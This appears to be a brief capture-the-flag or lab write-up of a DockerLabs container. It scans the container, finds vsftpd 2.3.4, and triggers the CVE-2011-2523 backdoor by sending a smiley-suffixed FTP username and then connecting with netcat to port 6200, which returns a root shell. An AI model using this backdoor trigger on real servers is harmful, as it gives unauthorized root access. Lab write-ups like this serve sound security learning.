# IP
172.17.0.2
# Enumeration
## ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.614 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.052 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 0.052/0.333/0.614/0.281 ms
```
## Port scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nmap -vv 172.17.0.2
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```
## Vuln
FTP service out of date vsftpd 2.3.4
Succeptible to CVE-2011-2523 backdoor

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ telnet 172.17.0.2 21
Trying 172.17.0.2...
Connected to 172.17.0.2.
Escape character is '^]'.
220 (vsFTPd 2.3.4)
USER anonymous:)
331 Please specify the password.
PASS password

```

```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nc 172.17.0.2 6200
whoami
root
```